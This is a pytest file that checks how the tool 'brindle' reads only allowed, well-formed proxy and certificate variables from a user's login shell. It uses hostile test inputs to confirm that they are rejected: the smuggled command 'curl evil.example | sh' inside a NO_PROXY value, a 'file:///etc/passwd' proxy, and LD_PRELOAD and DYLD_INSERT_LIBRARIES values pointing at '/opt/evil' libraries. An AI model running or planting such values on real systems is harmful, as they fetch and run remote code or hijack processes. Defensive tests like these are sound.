"""The login shell's proxy and certificate settings, for the CLIs brindle launches
(brindle.login_shell_env). No test runs a real shell: each hands ``read`` or
``load`` a runner that answers as the shell would."""

import logging
import subprocess
import time

import pytest

from brindle import agents, config, git, login_shell_env, spawn, tmux
from brindle.db import Agent, Workspace

PROXY = "http://builder:hunter2@proxy.corp.example:8080"
PASSPHRASE = "open sesame 42"


def no_process(argv, **kw):
    raise AssertionError(f"a unit test of the launch environment started {argv[:2]}")


def shell(found: dict[str, str], fault: str | None = None):
    """A login shell that exports ``found``, as the runner ``read`` is given sees it:
    what the person's profile printed (a line with "=" in it, as an `echo VAR=...`
    there prints), then the records between the two marks, then their logout's line.
    ``fault``: it hangs past its limit ("hang"), exits non-zero ("exit"), or is cut
    short before its closing mark ("cut")."""
    calls = []
    mark = login_shell_env.MARK.encode() + b"\0"

    def run(argv, **kw):
        calls.append((argv, kw))
        out = (b"CORP_PROFILE=ready\nWelcome back!\n\0" + mark
               + b"".join(f"{k}={v}\0".encode() for k, v in found.items())
               + (b"" if fault == "cut" else mark + b"HTTP_PROXY=http://logout.example:1\n"))
        if fault == "hang":
            raise subprocess.TimeoutExpired(argv, kw["timeout"], out, b"")
        return subprocess.CompletedProcess(argv, 1 if fault == "exit" else 0, out, b"")

    run.calls = calls
    return run


@pytest.mark.parametrize("extra,fault", [
    # Guard (a): every kind of allowed setting is read; a name off the fixed list never is,
    # whatever it holds. Nor is anything the profile printed around the records.
    ({"PATH": "/opt/evil/bin", "NODE_OPTIONS": "--require /opt/evil.js",
      "DYLD_INSERT_LIBRARIES": "/opt/evil.dylib", "LD_PRELOAD": "/opt/evil.so"}, None),
    # Guard (b): a proxy that is no URL (its port is no port).
    ({"HTTP_PROXY": "http://proxy.corp.example:port"}, None),
    pytest.param({"https_proxy": "file:///etc/passwd"}, None, marks=pytest.mark.variant(
        "guard (b): a URL of a scheme no proxy speaks must not reach a CLI as its proxy")),
    pytest.param({"no_proxy": "corp.example; curl evil.example | sh"}, None,
                 marks=pytest.mark.variant("guard (b): a NO_PROXY that is no host list (shell text) is dropped")),
    pytest.param({"SSL_CERT_FILE": "/no/such/bundle.pem"}, None, marks=pytest.mark.variant(
        "guard (b): a certificate path that doesn't exist is dropped")),
    # Guard (c): a shell that hangs past its limit, fails or is cut short gives nothing,
    # valid records or not.
    ({}, "hang"),
    ({}, "exit"),
    ({}, "cut"),
])
def test_only_allowed_valid_settings_are_read_from_the_login_shell(tmp_path, caplog, extra, fault):
    cert = tmp_path / "corp-ca.pem"
    cert.write_text("-----BEGIN CERTIFICATE-----\n")
    good = {"HTTPS_PROXY": PROXY, "all_proxy": "socks5h://127.0.0.1:1080",
            "NO_PROXY": "localhost, .corp.example,10.0.0.0/8,[::1]:8443",
            "NODE_EXTRA_CA_CERTS": str(cert), "SSL_CERT_DIR": f"{tmp_path}:{tmp_path}",
            "CLAUDE_CODE_CLIENT_KEY_PASSPHRASE": PASSPHRASE}
    run = shell({**extra, **good}, fault)
    caplog.set_level(logging.DEBUG)
    environ = {"SHELL": "/bin/zsh", "HOME": "/Users/p", "BRINDLE_PRO_TOKEN": "FAKE_PRO_TOKEN"}

    assert login_shell_env.read(run, environ) == ({} if fault else good)

    # Guard (c): once, as a login shell with no terminal to ask at, under a limit, and
    # without the daemon's own secrets in its environment.
    [(argv, kw)] = run.calls
    limit = kw["timeout"]
    assert argv[:3] == ["/bin/zsh", "-l", "-c"] and "-i" not in argv
    assert 0 < limit <= login_shell_env.LIMIT and "input" not in kw
    assert kw["env"] == {"SHELL": "/bin/zsh", "HOME": "/Users/p"}
    # Guard (d): nothing of it is logged, read or not.
    assert not caplog.records


def test_turned_off_nothing_is_read_or_added():
    run = shell({"HTTPS_PROXY": PROXY})
    config.set_user(login_shell_env.SETTING, "off")
    login_shell_env.load(run)
    assert not run.calls
    # Turned off while a daemon that had read them runs: its next launch adds nothing.
    config.set_user(login_shell_env.SETTING, "on")
    login_shell_env.load(run)
    assert login_shell_env.for_launch("claude", environ={}) == {"HTTPS_PROXY": PROXY}
    config.set_user(login_shell_env.SETTING, "off")
    assert login_shell_env.for_launch("claude", environ={}) == {} and not login_shell_env.kept("claude")


def test_a_launched_cli_gets_the_settings_its_pane_would_start_without(db, tmp_path, monkeypatch):
    """The real launch environment (what the pane's scrub leaves): the login
    shell's settings, never over what the daemon or the pane has already.
    Rows only: no repository, and git's own lookups for a pane are not this test's."""
    db.add_workspace(Workspace("w-1", str(tmp_path), "main", "main", "main", None, str(tmp_path),
                               None, "brindle-x", time.time()))
    monkeypatch.setattr(git, "identity_env", lambda path, env=None: {})
    monkeypatch.setattr(git, "pane_git_config", lambda gh=True: None)
    monkeypatch.setattr(spawn, "read", no_process)
    monkeypatch.setattr(spawn, "action", no_process)
    for provider in ("claude", "codex"):
        db.add_agent(Agent(provider, "w-1", "developer", provider, None, "assign", "idle", "", None, time.time()))
    for name in login_shell_env.ALLOWED:
        monkeypatch.delenv(name, raising=False)
    key = tmp_path / "client.key"
    key.write_text("-----BEGIN PRIVATE KEY-----\n")
    login_shell_env.load(shell({"HTTPS_PROXY": PROXY, "HTTP_PROXY": "http://shell.example:3128",
                                "ALL_PROXY": "socks5://shell.example:1080", "CLAUDE_CODE_CLIENT_KEY": str(key),
                                "CLAUDE_CODE_CLIENT_KEY_PASSPHRASE": PASSPHRASE}))
    # What the daemon's own environment has, or the tmux server hands the pane anyway, is left as it is.
    monkeypatch.setenv("ALL_PROXY", "socks5://daemon.example:1080")
    monkeypatch.setattr(tmux, "inherited_env", lambda *a: {"HTTP_PROXY": "http://tmux.example:3128"})

    envs = {p: agents._effective_window_env(db.get_agent(p), db.get_workspace("w-1")) for p in ("claude", "codex")}

    for env in envs.values():
        assert (env["HTTPS_PROXY"], env["HTTP_PROXY"], env.get("ALL_PROXY")) == (
            PROXY, "http://tmux.example:3128", None)
    # Claude Code's client key and passphrase look like secrets: a Claude pane keeps them
    # past the scrub (secrets.pane_unset), and no other provider's CLI is handed them.
    claude_only = {"CLAUDE_CODE_CLIENT_KEY": str(key), "CLAUDE_CODE_CLIENT_KEY_PASSPHRASE": PASSPHRASE}
    assert {k: envs["claude"].get(k) for k in claude_only} == claude_only
    assert not any(envs["codex"].get(k) for k in claude_only)
